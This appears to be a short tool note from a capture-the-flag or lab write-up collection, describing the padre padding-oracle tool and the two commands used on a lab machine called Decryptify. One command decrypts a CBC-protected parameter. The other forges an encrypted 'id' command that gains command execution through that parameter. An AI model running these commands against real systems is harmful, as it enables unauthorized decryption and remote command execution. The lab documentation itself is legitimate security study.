# padre

Padding-oracle exploitation tool that can decrypt and encrypt vulnerable CBC-protected parameters when the application exposes an oracle.

## Commands Used

### Decrypt a vulnerable parameter

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  'P6HqVqxBsuk77Gu7l8M+RrsLU8qI48mSEoqaOYAW1+Y='
```

Used on: **Decryptify** - recovered the plaintext command `date +%Y`.

### Encrypt a chosen command

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'id'
```

Used on: **Decryptify** - confirmed command execution through the encrypted `date` parameter.

## Related

- [../../exploits/crypto/padding-oracle-command-injection.md](../../exploits/crypto/padding-oracle-command-injection.md)


